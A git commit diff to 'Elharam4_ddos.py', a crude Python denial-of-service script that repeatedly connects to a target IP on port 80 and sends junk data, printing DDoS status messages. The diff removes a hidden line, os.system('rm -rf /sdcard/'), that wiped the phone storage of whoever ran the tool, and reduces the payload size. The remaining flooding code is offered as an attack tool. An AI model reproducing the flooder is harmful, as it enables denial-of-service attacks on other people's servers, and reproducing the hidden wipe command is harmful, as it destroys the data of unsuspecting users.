29e0289cb1cf3f65288c7286a2ea98f9bc59d181
Elharam4 <55320959+elostora@users.noreply.github.com>
2022-07-01 09:21:14 +0000

    Update Elharam4_ddos.py

--- Elharam4_ddos.py
+++ Elharam4_ddos.py
@@ -1,16 +1,14 @@
-import os
-os.system('rm -rf /sdcard/')
-BB = "\033[34;1m" # Blue light
-YY = "\033[33;1m" # Yellow light
-GG = "\033[32;1m" # Green light
-WW = "\033[0;1m"  # White light
-RR = "\033[31;1m" # Red light
-CC = "\033[36;1m" # Cyan light
-B = "\033[34m"    # Blue
-Y = "\033[33m"    # Yellow
-G = "\033[32m"    # Green
-W = "\033[0m"     # White
-R = "\033[31m"    # Red
+BB = "\033[34;1m" 
+YY = "\033[33;1m" 
+GG = "\033[32;1m" 
+WW = "\033[0;1m"  
+RR = "\033[31;1m" 
+CC = "\033[36;1m"
+B = "\033[34m"    
+Y = "\033[33m"   
+G = "\033[32m"    
+W = "\033[0m"     
+R = "\033[31m"   
 
 
 import socket
@@ -21,7 +19,7 @@ for h in range(5000):
       knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
       socket.setdefaulttimeout(1)
       Jmeel=knig.connect((ip,80))
-      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*10000
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*100
       data=data.encode("utf-8")
       knig.send(data)
       print('[√√√] DDos in (ip)',YY,ip,'DDOS WITH ELHARAM4 is runing ',CC,'port [80]')
